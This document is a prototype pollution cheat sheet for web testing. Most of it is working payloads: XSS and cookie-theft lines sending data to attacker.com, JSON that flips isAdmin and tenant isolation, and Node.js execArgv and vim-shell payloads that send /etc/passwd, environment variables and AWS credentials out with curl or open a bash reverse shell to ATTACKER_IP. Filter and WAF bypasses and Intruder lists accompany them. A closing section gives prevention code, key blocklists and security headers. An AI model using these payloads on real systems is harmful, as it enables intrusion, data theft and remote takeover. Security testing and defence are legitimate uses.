# Prototype Pollution Cheat Sheet

## Detection Payloads

### Client-Side Detection

```javascript
// Query String
?__proto__[test]=vulnerable
?__proto__.test=vulnerable
?constructor[prototype][test]=vulnerable

// Hash/Fragment
#__proto__[test]=vulnerable
#constructor[prototype][test]=vulnerable

// Check in Console
Object.prototype
Object.prototype.test  // Should return "vulnerable" if exploitable

// Programmatic Detection
(function() {
    const url = new URL(window.location.href);
    url.searchParams.set('__proto__[pptest]', '1');
    return Object.prototype.pptest === '1' ? 'VULNERABLE' : 'SAFE';
})();
```

### Server-Side Detection

```json
// Property Reflection
{
    "data": "test",
    "__proto__": {
        "polluted": "value"
    }
}
// Check response for "polluted": "value" without explicit declaration

// JSON Spaces (Non-Destructive)
{
    "data": "test",
    "__proto__": {
        "json spaces": 10
    }
}
// Check for increased indentation in raw response

// Status Code Override
{
    "data": "test",
    "__proto__": {
        "status": 555
    }
}
// Check for HTTP 555 status code

// Charset Override (body-parser)
{
    "data": "test",
    "__proto__": {
        "content-type": "application/json; charset=utf-7"
    }
}
// Check if UTF-7 encoding is applied
```

---

## Exploitation Payloads

### Client-Side XSS

```javascript
// Basic XSS via transport_url gadget
?__proto__[transport_url]=data:,alert(1);
?__proto__[transport_url]=data:,alert(document.domain);
?__proto__[transport_url]=data:,alert(document.cookie);

// Browser API bypass (value property)
?__proto__[value]=data:,alert(1);

// Hash-based (third-party libraries)
#__proto__[hitCallback]=alert(1)
#__proto__[hitCallback]=alert(document.cookie)

// Constructor alternative
?constructor[prototype][transport_url]=data:,alert(1);

// Fetch API header injection
?__proto__[headers][X-Custom]=<img src=x onerror=alert(1)>

// jQuery selector injection
?__proto__[url]=javascript:alert(1)

// eval() sink
?__proto__[code]=alert(1)

// setTimeout() sink
?__proto__[callback]=alert(1)

// innerHTML sink
?__proto__[html]=<img src=x onerror=alert(1)>
```

### Client-Side Data Exfiltration

```javascript
// Cookie theft
?__proto__[transport_url]=data:,fetch('//attacker.com?c='+document.cookie);

// Credentials exfiltration
?__proto__[callback]=function(){fetch('//attacker.com',{method:'POST',body:document.body.innerHTML})}

// Form data capture
?__proto__[onsubmit]=function(e){fetch('//attacker.com?data='+JSON.stringify(e.target))}
```

### Sanitization Bypass

```javascript
// Non-recursive filter bypass
?__pro__proto__to__[test]=value
// After filtering: __proto__[test]=value

// Constructor bypass
?constconstructorructor[protoprototypetype][test]=value
// After filtering: constructor[prototype][test]=value

// Mixed bypass
?__pro__proto__to__[transport_url]=data:,alert(1);
?constconstructorructor[protoprototypetype][gadget]=payload

// Unicode encoding (if applicable)
?__proto\_\u005f[test]=value

// Case variation (if case-insensitive)
?__PROTO__[test]=value
?__Proto__[test]=value
```

### Server-Side Privilege Escalation

```json
// Admin bypass
{
    "data": "...",
    "__proto__": {
        "isAdmin": true
    }
}

// Authentication bypass
{
    "data": "...",
    "__proto__": {
        "isAuthenticated": true,
        "userId": "admin",
        "role": "administrator"
    }
}

// Authorization bypass
{
    "data": "...",
    "__proto__": {
        "canAccess": true,
        "permissions": ["read", "write", "delete"],
        "privilegeLevel": 999
    }
}

// Rate limiting bypass
{
    "data": "...",
    "__proto__": {
        "rateLimit": false,
        "bypassRateLimit": true
    }
}

// Multi-tenant isolation bypass
{
    "data": "...",
    "__proto__": {
        "tenantId": "victim-tenant-id",
        "organizationId": "victim-org-id",
        "bypassIsolation": true
    }
}

// Feature flag manipulation
{
    "data": "...",
    "__proto__": {
        "premiumFeatures": true,
        "betaAccess": true,
        "apiAccess": true
    }
}
```

### Server-Side RCE (Node.js)

```json
// RCE via execArgv (child_process.fork)
{
    "data": "...",
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('COMMAND')"
        ]
    }
}

// Specific commands
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('curl https://attacker.com')"
        ]
    }
}

{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('rm /path/to/file')"
        ]
    }
}

{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('cat /etc/passwd > /tmp/exfil')"
        ]
    }
}

// RCE via vim shell (child_process.execSync)
{
    "data": "...",
    "__proto__": {
        "shell": "vim",
        "input": ":! COMMAND\n"
    }
}

// Specific vim payloads
{
    "__proto__": {
        "shell": "vim",
        "input": ":! curl https://attacker.com\n"
    }
}

{
    "__proto__": {
        "shell": "vim",
        "input": ":! cat /etc/passwd | curl -d @- https://attacker.com\n"
    }
}

// Reverse shell
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')"
        ]
    }
}

// Data exfiltration with base64
{
    "__proto__": {
        "shell": "vim",
        "input": ":! cat /path/to/secret | base64 | curl -d @- https://attacker.com\n"
    }
}

// Directory listing
{
    "__proto__": {
        "shell": "vim",
        "input": ":! ls -la /home | base64 | curl -d @- https://attacker.com\n"
    }
}

// Environment variables
{
    "__proto__": {
        "shell": "vim",
        "input": ":! env | curl -d @- https://attacker.com\n"
    }
}

// AWS metadata (SSRF + RCE)
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name | curl -d @- https://attacker.com')"
        ]
    }
}
```

---

## Gadget Chains

### Common Client-Side Gadgets

```javascript
// Script src manipulation
config.transport_url → script.src → XSS

// fetch() options
config.url → fetch(config.url) → SSRF
config.headers → fetch(url, {headers: config.headers}) → Header injection

// jQuery AJAX
config.url → $.ajax({url: config.url}) → SSRF
config.dataType → $.ajax({dataType: config.dataType}) → Script execution

// setTimeout/setInterval
config.callback → setTimeout(config.callback, 0) → Code execution
config.hitCallback → setTimeout(config.hitCallback, 0) → Code execution

// eval() sinks
config.code → eval(config.code) → Code execution
config.expression → Function(config.expression)() → Code execution

// DOM manipulation
config.html → element.innerHTML = config.html → XSS
config.template → element.innerHTML = template(config.template) → XSS

// Object.defineProperty bypass
descriptor.value → Object.defineProperty(obj, 'prop', descriptor) → Property injection
```

### Common Server-Side Gadgets

```javascript
// Authorization checks
user.isAdmin → if (user.isAdmin) { grantAccess(); }
options.authenticated → if (options.authenticated) { proceed(); }

// Configuration options
config.debug → if (config.debug) { exposeInternals(); }
options.bypassSecurity → if (!options.bypassSecurity) { checkAuth(); }

// Feature flags
features.premiumAccess → if (features.premiumAccess) { allowFeature(); }

// Process spawning (RCE)
options.execArgv → fork(script, [], {execArgv: options.execArgv})
options.shell → execSync(cmd, {shell: options.shell})
options.input → execSync(cmd, {input: options.input})

// JSON serialization
config['json spaces'] → JSON.stringify(data, null, config['json spaces'])

// HTTP responses
error.status → res.status(error.status).json({...})
```

---

## Bypass Techniques

### Filter Evasion

```javascript
// Non-recursive string replacement
Input:  __pro__proto__to__
Filter: __proto__ → (removed)
Result: __proto__

Input:  constconstructorructor
Filter: constructor → (removed)
Result: constructor

// Case manipulation (if case-insensitive)
__PROTO__
__Proto__
__pRoTo__

// Unicode escaping
__proto\_\u005f
\u005f\u005fproto\u005f\u005f

// Alternate property access
constructor.prototype
Object.getPrototypeOf

// Deep nesting
__pro__pro__proto__to__to__
// After 2 passes: __proto__
```

### WAF Bypass

```javascript
// Obfuscation
?__proto__%5Btest%5D=value  // URL encoded brackets

// Chunked encoding (HTTP/2)
POST /api/endpoint HTTP/2
Transfer-Encoding: chunked

// JSON with different encodings
{"__proto__":{"test":"\u0076alue"}}

// Alternate content types
Content-Type: application/x-www-form-urlencoded
__proto__[test]=value

// Parameter pollution
?__proto__[test]=safe&__proto__[test]=malicious
// Some parsers use the last value

// Mixed encoding
?__proto__%5B%74est%5D=%76alue
```

---

## Testing Commands

### cURL Commands

```bash
# Client-side detection (won't show in response, need browser)
curl -v "https://target.com/?__proto__[test]=value"

# Server-side JSON spaces detection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{
    "data": "test",
    "__proto__": {
      "json spaces": 10
    }
  }'

# Server-side status code detection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -w "\nHTTP Status: %{http_code}\n" \
  -d '{
    "__proto__": {
      "status": 555
    }
  }'

# Property reflection detection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "testProperty": "vulnerable"
    }
  }' | jq '.'

# RCE test with Burp Collaborator
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "execArgv": [
        "--eval=require(\"child_process\").execSync(\"curl https://YOUR-COLLAB.oastify.com\")"
      ]
    }
  }'

# GET parameter testing
curl -G "https://target.com/endpoint" \
  --data-urlencode "__proto__[test]=value"

# Cookie-based (if parsed as JSON)
curl https://target.com/endpoint \
  -H "Cookie: config={\"__proto__\":{\"test\":\"value\"}}"
```

### Python Scripts

```python
import requests
import json

# Basic detection
def test_prototype_pollution(url, endpoint):
    payload = {
        "data": "test",
        "__proto__": {
            "json spaces": 10
        }
    }

    response = requests.post(f"{url}{endpoint}", json=payload)

    # Check for increased indentation
    if response.text.count('\n') > 5 and '          ' in response.text:
        print("[!] VULNERABLE - JSON spaces pollution detected!")
        return True
    else:
        print("[*] Not vulnerable")
        return False

# Property reflection test
def test_property_reflection(url, endpoint):
    test_prop = "pptest_12345"
    payload = {
        "data": "test",
        "__proto__": {
            test_prop: "vulnerable"
        }
    }

    response = requests.post(f"{url}{endpoint}", json=payload)

    try:
        data = response.json()
        if test_prop in data and data[test_prop] == "vulnerable":
            print(f"[!] VULNERABLE - Property {test_prop} reflected!")
            return True
    except:
        pass

    print("[*] Not vulnerable")
    return False

# Status code test
def test_status_code(url, endpoint):
    payload = {
        "data": "test",
        "__proto__": {
            "status": 555
        }
    }

    response = requests.post(f"{url}{endpoint}", json=payload)

    if response.status_code == 555:
        print("[!] VULNERABLE - Status code pollution detected!")
        return True
    else:
        print("[*] Not vulnerable")
        return False

# Usage
url = "https://target.com"
endpoint = "/api/update"

test_prototype_pollution(url, endpoint)
test_property_reflection(url, endpoint)
test_status_code(url, endpoint)
```

### JavaScript (Browser Console)

```javascript
// Quick detection
(function() {
    const testProp = 'pptest_' + Date.now();

    // Test query string
    const url = new URL(window.location.href);
    url.searchParams.set(`__proto__[${testProp}]`, 'vulnerable');

    // Update URL without reload
    window.history.pushState({}, '', url);

    // Check prototype
    setTimeout(() => {
        if (Object.prototype[testProp] === 'vulnerable') {
            console.warn('[VULNERABLE] Prototype pollution detected!');
            console.log('Polluted property:', testProp);
            delete Object.prototype[testProp];
        } else {
            console.log('[SAFE] No prototype pollution detected');
        }
    }, 100);
})();

// Comprehensive scanner
(function() {
    console.log('[PP Scanner] Starting comprehensive scan...');

    const tests = [
        {
            name: 'Query String',
            pollute: () => {
                const url = new URL(window.location.href);
                url.searchParams.set('__proto__[pptest1]', '1');
                window.history.pushState({}, '', url);
            },
            check: () => Object.prototype.pptest1 === '1'
        },
        {
            name: 'Hash Fragment',
            pollute: () => {
                window.location.hash = '#__proto__[pptest2]=1';
            },
            check: () => Object.prototype.pptest2 === '1'
        },
        {
            name: 'Constructor',
            pollute: () => {
                const url = new URL(window.location.href);
                url.searchParams.set('constructor[prototype][pptest3]', '1');
                window.history.pushState({}, '', url);
            },
            check: () => Object.prototype.pptest3 === '1'
        }
    ];

    setTimeout(() => {
        tests.forEach(test => {
            try {
                test.pollute();
                setTimeout(() => {
                    if (test.check()) {
                        console.warn(`[VULNERABLE] ${test.name}`);
                    } else {
                        console.log(`[SAFE] ${test.name}`);
                    }
                }, 50);
            } catch (e) {
                console.error(`[ERROR] ${test.name}:`, e);
            }
        });

        // Cleanup
        setTimeout(() => {
            delete Object.prototype.pptest1;
            delete Object.prototype.pptest2;
            delete Object.prototype.pptest3;
        }, 500);
    }, 100);
})();
```

---

## Burp Suite Commands

### Repeater Workflows

**Client-Side Testing:**
1. Navigate to target URL
2. Right-click → "Open in browser" (Burp's built-in)
3. Manually add `?__proto__[test]=value` to URL
4. Open DevTools Console
5. Check `Object.prototype`

**Server-Side Testing:**
1. Find JSON POST in Proxy history
2. Send to Repeater (`Ctrl+R`)
3. Modify JSON body to include `__proto__`
4. Send (`Ctrl+Space`)
5. Examine response (Pretty/Raw tabs)

### DOM Invader

```
1. Enable DOM Invader
   - Burp → Built-in Browser
   - DOM Invader (bottom panel)
   - Settings → Enable "Prototype pollution"

2. Navigate to target
   - DOM Invader auto-detects sources

3. Scan for gadgets
   - Click "Scan for gadgets"
   - Wait for analysis
   - Review found gadgets

4. Exploit
   - Select gadget
   - Click "Exploit"
   - Verify alert() or payload execution
```

### Intruder Payloads

**Positions:**
```json
{
    "data": "test",
    "__proto__": {
        "§property§": "§value§"
    }
}
```

**Payload Lists (Property Names):**
```
isAdmin
isAuthenticated
role
canAccess
privilegeLevel
userId
tenantId
organizationId
permissions
features
debug
bypassSecurity
rateLimit
apiKey
```

**Payload Lists (Values):**
```
true
false
admin
administrator
999
0
null
[]
{}
```

### Collaborator Integration

**Setup:**
1. Burp menu → Burp Collaborator client
2. Click "Copy to clipboard"
3. Note your unique domain: `YOUR-ID.oastify.com`

**Usage in Payloads:**
```json
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('curl https://YOUR-ID.oastify.com')"
        ]
    }
}
```

**Polling:**
1. Click "Poll now" in Collaborator client
2. Look for DNS queries and HTTP requests
3. Review interaction details

---

## Prevention Code Examples

### JavaScript/Node.js

```javascript
// 1. Sanitize property keys (Allowlist)
const ALLOWED_PROPERTIES = ['name', 'email', 'address', 'city', 'postcode'];

function safeAssign(target, source) {
    for (const key of ALLOWED_PROPERTIES) {
        if (source.hasOwnProperty(key)) {
            target[key] = source[key];
        }
    }
    return target;
}

// 2. Sanitize property keys (Blocklist - less secure)
function isPrototypePollutionKey(key) {
    return ['__proto__', 'constructor', 'prototype'].includes(key);
}

function safeMerge(target, source) {
    for (const key in source) {
        if (source.hasOwnProperty(key) && !isPrototypePollutionKey(key)) {
            if (typeof source[key] === 'object' && source[key] !== null) {
                target[key] = safeMerge(target[key] || {}, source[key]);
            } else {
                target[key] = source[key];
            }
        }
    }
    return target;
}

// 3. Use objects without prototypes
function createSafeConfig(defaults = {}) {
    const config = Object.create(null);
    return Object.assign(config, defaults);
}

// Usage
const config = createSafeConfig({
    apiUrl: '/api',
    timeout: 5000
});

// 4. Freeze prototypes (global protection)
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);

// 5. Use Map instead of objects
const config = new Map();
config.set('apiUrl', '/api');
config.set('timeout', 5000);
// Map.get() only accesses direct properties

// 6. Express middleware for protection
const express = require('express');
const app = express();

app.use((req, res, next) => {
    function checkObject(obj, path = '') {
        if (typeof obj !== 'object' || obj === null) return;

        for (const key in obj) {
            if (['__proto__', 'constructor', 'prototype'].includes(key)) {
                console.error(`[SECURITY] PP attempt detected: ${path}.${key}`);
                return res.status(400).json({
                    error: 'Invalid input detected'
                });
            }

            if (typeof obj[key] === 'object') {
                checkObject(obj[key], `${path}.${key}`);
            }
        }
    }

    checkObject(req.body);
    checkObject(req.query);
    next();
});

// 7. Secure JSON parsing
const secureJsonParse = require('secure-json-parse');

app.use(express.json({
    verify: (req, res, buf) => {
        try {
            secureJsonParse(buf.toString());
        } catch (e) {
            throw new Error('Invalid JSON structure');
        }
    }
}));

// 8. Lodash safe merge
const _ = require('lodash');

_.mergeWith(target, source, (objValue, srcValue, key) => {
    // Block prototype pollution keys
    if (['__proto__', 'constructor', 'prototype'].includes(key)) {
        return objValue; // Don't merge
    }
});
```

### Python/Flask

```python
from flask import Flask, request, jsonify
import json

app = Flask(__name__)

# Middleware to check for prototype pollution attempts
@app.before_request
def check_prototype_pollution():
    BLOCKED_KEYS = ['__proto__', 'constructor', 'prototype']

    def check_dict(d, path=''):
        if not isinstance(d, dict):
            return True

        for key, value in d.items():
            if key in BLOCKED_KEYS:
                return False, f"Blocked key detected: {path}.{key}"

            if isinstance(value, dict):
                result, msg = check_dict(value, f"{path}.{key}")
                if not result:
                    return result, msg

        return True, None

    if request.is_json:
        result, msg = check_dict(request.json)
        if not result:
            return jsonify({'error': 'Invalid input'}), 400

# Safe property assignment
def safe_update(target, source, allowed_keys):
    """Only update allowed keys"""
    for key in allowed_keys:
        if key in source:
            target[key] = source[key]
    return target

# Usage
@app.route('/api/update', methods=['POST'])
def update_user():
    data = request.json
    user = {}

    # Allowlist approach
    ALLOWED_KEYS = ['name', 'email', 'address']
    safe_update(user, data, ALLOWED_KEYS)

    return jsonify(user)
```

### React/TypeScript

```typescript
// Type-safe configuration
interface SafeConfig {
    apiUrl: string;
    timeout: number;
    headers?: Record<string, string>;
}

// Sanitization function
function sanitizeObject<T>(obj: unknown, allowedKeys: (keyof T)[]): Partial<T> {
    if (typeof obj !== 'object' || obj === null) {
        return {};
    }

    const sanitized: Partial<T> = {};
    const BLOCKED_KEYS = ['__proto__', 'constructor', 'prototype'];

    for (const key of allowedKeys) {
        const strKey = String(key);
        if (BLOCKED_KEYS.includes(strKey)) {
            continue;
        }

        if (key in obj) {
            sanitized[key] = (obj as any)[key];
        }
    }

    return sanitized;
}

// Usage in component
function MyComponent(props: any) {
    const safeConfig = sanitizeObject<SafeConfig>(
        props.config,
        ['apiUrl', 'timeout', 'headers']
    );

    return <div>{/* Use safeConfig */}</div>;
}

// Server Action protection
'use server'

export async function updateUser(formData: FormData) {
    const ALLOWED_FIELDS = ['name', 'email', 'address'] as const;

    const data: Record<string, string> = {};
    for (const field of ALLOWED_FIELDS) {
        const value = formData.get(field);
        if (value && typeof value === 'string') {
            data[field] = value;
        }
    }

    // data is now safe from prototype pollution
    await db.users.update(data);
}
```

---

## Security Headers

```http
# Content Security Policy (mitigates client-side PP XSS)
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-RANDOM';
    object-src 'none';
    base-uri 'self';
    require-trusted-types-for 'script';

# Additional headers
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

---

## CVE Quick Reference

| CVE | Product | Severity | Description |
|-----|---------|----------|-------------|
| CVE-2025-55182 | React Server Components | CRITICAL (10.0) | Prototype pollution → RCE via deserialization |
| CVE-2025-66478 | Next.js | CRITICAL (10.0) | Related to React2Shell, Server Actions |
| CVE-2024-21505 | web3-utils | HIGH | Prototype pollution in web3 library |
| CVE-2021-23343 | path-parse | HIGH | Path parsing prototype pollution |
| CVE-2020-7598 | minimist | HIGH | Argument parsing PP |
| CVE-2019-11358 | jQuery < 3.4.0 | MEDIUM | jQuery.extend() PP |

---

## Industry Standards

**OWASP:**
- Top 10 A03:2021 (Injection)
- [Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)

**CWE:**
- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

**MITRE ATT&CK:**
- T1059: Command and Scripting Interpreter
- T1068: Exploitation for Privilege Escalation
- T1190: Exploit Public-Facing Application

**CAPEC:**
- CAPEC-10: Buffer Overflow via Environment Variables
- CAPEC-113: Interface Manipulation

---

## Tool Quick Reference

| Tool | Purpose | Link |
|------|---------|------|
| DOM Invader | Client-side PP detection & exploitation | Built into Burp Suite |
| Server-Side PP Scanner | Server-side PP detection | Burp BApp Store |
| PP Gadgets Finder | Gadget chain identification | [PortSwigger BApp](https://portswigger.net/bappstore/fcbc58b33fc1486d9a795dedba2ccbbb) |
| ppmap | CLI scanner | `npm install -g ppmap` |
| PPScan | Browser extension | Chrome/Firefox store |
| Dasty | Research tool for gadgets | [GitHub/Research Paper](https://arxiv.org/abs/2311.03919) |

---

## Quick Decision Tree

```
1. Can you control input to JSON endpoint or URL parameter?
   ├─ Yes → Test for prototype pollution
   │   ├─ Client-side (URL) → Test with ?__proto__[test]=value
   │   └─ Server-side (JSON) → Test with "__proto__": {"json spaces": 10}
   └─ No → Not applicable

2. Was prototype pollution detected?
   ├─ Yes → Find gadgets
   │   ├─ Client-side → Use DOM Invader or manual code analysis
   │   └─ Server-side → Look for boolean properties (isAdmin, etc.) or RCE vectors
   └─ No → Try bypass techniques or alternative vectors

3. Can you trigger gadgets?
   ├─ Yes → Exploit
   │   ├─ XSS → data:,alert(1);
   │   ├─ Privilege Escalation → "isAdmin": true
   │   └─ RCE → "execArgv": ["--eval=CODE"]
   └─ No → Document detection only, investigate further

4. Exploitation successful?
   ├─ Yes → Report vulnerability with PoC
   └─ No → Reassess gadget chains or input vectors
```

---

## Resources

**PortSwigger:**
- [Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [Server-Side PP Research](https://portswigger.net/research/server-side-prototype-pollution)

**OWASP:**
- [Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)

**Research Papers:**
- [Dasty: Unveiling the Invisible (2024)](https://arxiv.org/abs/2311.03919)
- [Doyensec PP Gadgets Finder](https://blog.doyensec.com/2024/02/17/server-side-prototype-pollution-Gadgets-scanner.html)

**CVE Databases:**
- [MITRE CVE](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=prototype+pollution)
- [Snyk Vulnerability DB](https://security.snyk.io/)

---

**Last Updated:** 2026-01-10
**Version:** 1.0 - Comprehensive Cheat Sheet
